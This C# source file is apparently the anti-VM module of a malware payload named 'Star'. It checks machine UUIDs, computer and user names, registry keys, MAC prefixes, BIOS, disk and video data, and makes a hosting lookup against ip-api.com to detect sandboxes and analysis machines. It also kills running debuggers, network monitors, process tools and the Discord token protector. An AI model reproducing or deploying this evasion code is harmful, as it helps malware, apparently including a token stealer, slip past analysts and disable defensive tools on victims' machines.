using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace Star.payload.Components.AntiVM
{
    internal static class Detector
    {
        #region Blacklists

        private static readonly string[] BlacklistedUuids =
        {
            "7AB5C494-39F5-4941-9163-47F54D6D5016", "032E02B4-0499-05C3-0806-3C0700080009",
            "03DE0294-0480-05DE-1A06-350700080009", "11111111-2222-3333-4444-555555555555",
            "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548",
            "4C4C4544-0050-3710-8058-CAC04F59344A", "00000000-0000-0000-0000-AC1F6BD04972",
            "49434D53-0200-9065-2500-65902500E439", "49434D53-0200-9036-2500-36902500F022",
            "00000000-0000-0000-0000-000000000000", "5BD24D56-789F-8468-7CDC-CAA7222CC121",
            "777D84B3-88D1-451C-93E4-D235177420A7", "49434D53-0200-9036-2500-369025000C65",
            "B1112042-52E8-E25B-3655-6A4F54155DBF", "00000000-0000-0000-0000-AC1F6BD048FE",
            "EB16924B-FB6D-4FA1-8666-17B91F62FB37", "A15A930C-8251-9645-AF63-E45AD728C20C",
            "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "C7D23342-A5D4-68A1-59AC-CF40F735B363",
            "63203342-0EB0-AA1A-4DF5-3FB37DBB0670", "44B94D56-65AB-DC02-86A0-98143A7423BF",
            "6608003F-ECE4-494E-B07E-1C4615D1D93C", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A",
            "49434D53-0200-9036-2500-369025003AF0", "8B4E8278-525C-7343-B825-280AEBCD3BCB",
            "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27", "79AF5279-16CF-4094-9758-F88A616D81B4",
            "FE822042-A70C-D08B-F1D1-C207055A488F", "76122042-C286-FA81-F0A8-514CC507B250",
            "481E2042-A1AF-D390-CE06-A8F783B1E76A", "F3988356-32F5-4AE1-8D47-FD3B8BAFBD4C",
            "9961A120-E691-4FFE-B67B-F0E4115D5919"
        };

        private static readonly string[] BlacklistedComputernames =
        {
            "bee7370c-8c0c-4", "desktop-nakffmt", "win-5e07cos9alr", "b30f0242-1c6a-4",
            "desktop-vrsqlag", "q9iatrkprh", "xc64zb", "desktop-d019gdm", "desktop-wi8clet",
            "server1", "lisa-pc", "john-pc", "desktop-b0t93d6", "desktop-1pykp29",
            "desktop-1y2433r", "wileypc", "work", "6c4e733f-c2d9-4", "ralphs-pc",
            "desktop-wg3myjs", "desktop-7xc6gez", "desktop-5ov9s0o", "qarzhrdbpj",
            "oreleepc", "archibaldpc", "julia-pc", "d1bnjkfvlh", "compname_5076",
            "desktop-vkeons4", "ntt-eff-2w11wss", "sandbox", "sample", "test"
        };

        private static readonly string[] BlacklistedUsers =
        {
            "wdagutilityaccount", "abby", "peter wilson", "hmarc", "patex", "john-pc",
            "rdhj0cnfevzx", "keecfmwgj", "frank", "8nl0colnq5bq", "lisa", "john",
            "george", "pxmduopvyx", "8vizsm", "w0fjuovmccp5a", "lmvwjj9b", "pqonjhvwexss",
            "3u2v9m8", "julia", "heuerzl", "harry johnson", "j.seance", "a.monaldo",
            "tvm", "sandbox", "virus", "malware", "vmware", "test", "currentuser"
        };

        private static readonly string[] BlacklistedTasks =
        {
            "fakenet", "dumpcap", "httpdebuggerui", "wireshark", "fiddler", "vboxservice",
            "df5serv", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg",
            "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc",
            "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga",
            "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver", "vmwareservice",
            "discordtokenprotector", "processhacker", "procmon", "procexp", "tcpview",
            "autoruns", "autorunsc", "filemon", "procmon", "regmon", "idaq", "idaq64",
            "idaw", "idaw64", "scylla", "scylla_x64", "scylla_x86", "protection_id",
            "windbg", "reshacker", "importrec", "immunitydebugger"
        };

        private static readonly string[] VmMacPrefixes =
        {
            "00:05:69", "00:0C:29", "00:1C:14", "00:50:56", // VMware
            "08:00:27", "0A:00:27",                         // VirtualBox
            "00:16:3E", "00:03:FF",                         // Xen
            "00:1C:42",                                      // Parallels
            "00:15:5D"                                       // Hyper-V
        };

        private static readonly string[] VmRegistryKeys =
        {
            // VMware
            @"SOFTWARE\VMware, Inc.\VMware Tools",
            @"HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0",
            @"SYSTEM\CurrentControlSet\Services\vmci",
            @"SYSTEM\CurrentControlSet\Services\vmhgfs",
            
            // VirtualBox
            @"SOFTWARE\Oracle\VirtualBox Guest Additions",
            @"HARDWARE\ACPI\DSDT\VBOX__",
            @"HARDWARE\ACPI\FADT\VBOX__",
            @"HARDWARE\ACPI\RSDT\VBOX__",
            @"SYSTEM\ControlSet001\Services\VBoxGuest",
            @"SYSTEM\ControlSet001\Services\VBoxMouse",
            @"SYSTEM\ControlSet001\Services\VBoxService",
            @"SYSTEM\ControlSet001\Services\VBoxSF",
            @"SYSTEM\ControlSet001\Services\VBoxVideo",
            
            // Hyper-V
            @"SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters",
            @"SOFTWARE\Microsoft\Hyper-V",
            @"SYSTEM\ControlSet001\Services\vmicheartbeat",
            @"SYSTEM\ControlSet001\Services\vmicvss",
            @"SYSTEM\ControlSet001\Services\vmicshutdown",
            @"SYSTEM\ControlSet001\Services\vmicexchange",
            
            // QEMU
            @"HARDWARE\Description\System",
            
            // Parallels
            @"SYSTEM\CurrentControlSet\Services\prl_fs",
            @"SYSTEM\CurrentControlSet\Services\prl_sf"
        };

        #endregion

        #region Main Detection Method

        public static bool IsVirtualMachine()
        {
            return CheckSystemUuid() ||
                   CheckComputerName() ||
                   CheckUsername() ||
                   CheckHosting() ||
                   CheckRunningProcesses() ||
                   CheckDebugger() ||
                   CheckRegistryKeys() ||
                   CheckMacAddress() ||
                   CheckBiosInfo() ||
                   CheckSystemResources() ||
                   CheckHypervisorPresence() ||
                   CheckDiskInfo() ||
                   CheckVideoController() ||
                   CheckSystemManufacturer();
        }

        #endregion

        #region Detection Methods

        private static bool CheckDebugger()
        {
            try
            {
                return Debugger.IsAttached;
            }
            catch
            {
                return false;
            }
        }

        private static bool CheckSystemUuid()
        {
            try
            {
                using (Process process = new Process())
                {
                    process.StartInfo.FileName = "wmic.exe";
                    process.StartInfo.Arguments = "csproduct get uuid";
                    process.StartInfo.CreateNoWindow = true;
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.Start();

                    string uuid = process.StandardOutput.ReadToEnd();
                    process.WaitForExit();

                    if (!string.IsNullOrEmpty(uuid))
                    {
                        uuid = uuid.Split('\n')[1].Trim();
                        return BlacklistedUuids.Contains(uuid.ToUpper());
                    }
                }
            }
            catch { }

            return false;
        }

        private static bool CheckRunningProcesses()
        {
            try
            {
                var processes = Process.GetProcesses();
                foreach (Process process in processes)
                {
                    try
                    {
                        if (BlacklistedTasks.Contains(process.ProcessName.ToLower()))
                        {
                            try
                            {
                                process.Kill();
                            }
                            catch
                            {
                                return true;
                            }
                        }
                    }
                    catch { }
                }
            }
            catch { }

            return false;
        }

        private static bool CheckUsername()
        {
            try
            {
                string username = Environment.UserName.ToLower();
                return BlacklistedUsers.Contains(username);
            }
            catch
            {
                return false;
            }
        }

        private static bool CheckComputerName()
        {
            try
            {
                string computerName = Environment.MachineName.ToLower();
                return BlacklistedComputernames.Contains(computerName);
            }
            catch
            {
                return false;
            }
        }

        private static bool CheckHosting()
        {
            try
            {
                using (WebClient wc = new WebClient())
                {
                    wc.Headers.Add("User-Agent", "Mozilla/5.0");
                    string result = wc.DownloadString("http://ip-api.com/line/?fields=hosting").Trim();
                    return result.Equals("true", StringComparison.OrdinalIgnoreCase);
                }
            }
            catch
            {
                return false;
            }
        }

        private static bool CheckRegistryKeys()
        {
            try
            {
                foreach (string key in VmRegistryKeys)
                {
                    try
                    {
                        if (key.StartsWith("HKEY_LOCAL_MACHINE\\") || key.StartsWith("HARDWARE\\") ||
                            key.StartsWith("SOFTWARE\\") || key.StartsWith("SYSTEM\\"))
                        {
                            string keyPath = key.Replace("HKEY_LOCAL_MACHINE\\", "");
                            using (RegistryKey regKey = Registry.LocalMachine.OpenSubKey(keyPath))
                            {
                                if (regKey != null)
                                    return true;
                            }
                        }
                    }
                    catch { }
                }

                // Check for VM-related registry values
                try
                {
                    using (RegistryKey scsiKey = Registry.LocalMachine.OpenSubKey(
                        @"HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0"))
                    {
                        if (scsiKey != null)
                        {
                            string identifier = scsiKey.GetValue("Identifier")?.ToString()?.ToLower();
                            if (!string.IsNullOrEmpty(identifier))
                            {
                                if (identifier.Contains("vbox") || identifier.Contains("vmware") ||
                                    identifier.Contains("qemu") || identifier.Contains("virtual"))
                                    return true;
                            }
                        }
                    }
                }
                catch { }
            }
            catch { }

            return false;
        }

        private static bool CheckMacAddress()
        {
            try
            {
                foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (nic.OperationalStatus == OperationalStatus.Up &&
                        nic.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                    {
                        string mac = nic.GetPhysicalAddress().ToString();
                        if (!string.IsNullOrEmpty(mac) && mac.Length >= 8)
                        {
                            string macPrefix = string.Format("{0}:{1}:{2}",
                                mac.Substring(0, 2), mac.Substring(2, 2), mac.Substring(4, 2));

                            if (VmMacPrefixes.Any(prefix =>
                                macPrefix.Equals(prefix, StringComparison.OrdinalIgnoreCase)))
                                return true;
                        }
                    }
                }
            }
            catch { }

            return false;
        }

        private static bool CheckBiosInfo()
        {
            try
            {
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_BIOS"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        string manufacturer = obj["Manufacturer"]?.ToString()?.ToLower() ?? "";
                        string version = obj["Version"]?.ToString()?.ToLower() ?? "";
                        string serialNumber = obj["SerialNumber"]?.ToString()?.ToLower() ?? "";

                        if (manufacturer.Contains("vmware") || manufacturer.Contains("vbox") ||
                            manufacturer.Contains("virtualbox") || manufacturer.Contains("qemu") ||
                            manufacturer.Contains("parallels") || manufacturer.Contains("xen") ||
                            version.Contains("vbox") || version.Contains("vmware") ||
                            version.Contains("qemu") || version.Contains("virtual") ||
                            serialNumber.Contains("vmware") || serialNumber.Contains("vbox"))
                            return true;
                    }
                }
            }
            catch { }

            return false;
        }

        private static bool CheckSystemResources()
        {
            try
            {
                // Check RAM (less than 4GB is suspicious)
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        ulong totalMemory = Convert.ToUInt64(obj["TotalPhysicalMemory"]);
                        double memoryGB = totalMemory / (1024.0 * 1024.0 * 1024.0);

                        if (memoryGB < 2.0)
                            return true;
                    }
                }

                // Check CPU cores (1 core is suspicious)
                int coreCount = Environment.ProcessorCount;
                if (coreCount < 2)
                    return true;

                // Check screen resolution (very low resolution is suspicious)
                int screenWidth = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width;
                int screenHeight = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height;

                if (screenWidth < 800 || screenHeight < 600)
                    return true;
            }
            catch { }

            return false;
        }

        private static bool CheckHypervisorPresence()
        {
            try
            {
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(
                    "SELECT * FROM Win32_ComputerSystem"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        string model = obj["Model"]?.ToString()?.ToLower() ?? "";
                        string hypervisor = obj["HypervisorPresent"]?.ToString()?.ToLower() ?? "";

                        if (model.Contains("virtual") || hypervisor == "true")
                            return true;
                    }
                }
            }
            catch { }

            return false;
        }

        private static bool CheckDiskInfo()
        {
            try
            {
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        string model = obj["Model"]?.ToString()?.ToLower() ?? "";
                        string caption = obj["Caption"]?.ToString()?.ToLower() ?? "";

                        if (model.Contains("vbox") || model.Contains("vmware") ||
                            model.Contains("virtual") || model.Contains("qemu") ||
                            caption.Contains("vbox") || caption.Contains("vmware"))
                            return true;
                    }
                }
            }
            catch { }

            return false;
        }

        private static bool CheckVideoController()
        {
            try
            {
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_VideoController"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        string name = obj["Name"]?.ToString()?.ToLower() ?? "";
                        string description = obj["Description"]?.ToString()?.ToLower() ?? "";

                        if (name.Contains("vmware") || name.Contains("vbox") ||
                            name.Contains("virtualbox") || name.Contains("virtual") ||
                            description.Contains("vmware") || description.Contains("vbox"))
                            return true;
                    }
                }
            }
            catch { }

            return false;
        }

        private static bool CheckSystemManufacturer()
        {
            try
            {
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        string manufacturer = obj["Manufacturer"]?.ToString()?.ToLower() ?? "";
                        string model = obj["Model"]?.ToString()?.ToLower() ?? "";

                        if (manufacturer.Contains("vmware") || manufacturer.Contains("microsoft corporation") ||
                            manufacturer.Contains("virtualbox") || manufacturer.Contains("parallels") ||
                            manufacturer.Contains("qemu") || manufacturer.Contains("xen") ||
                            model.Contains("virtualbox") || model.Contains("vmware") ||
                            model.Contains("virtual"))
                            return true;
                    }
                }
            }
            catch { }

            return false;
        }

        #endregion
    }
}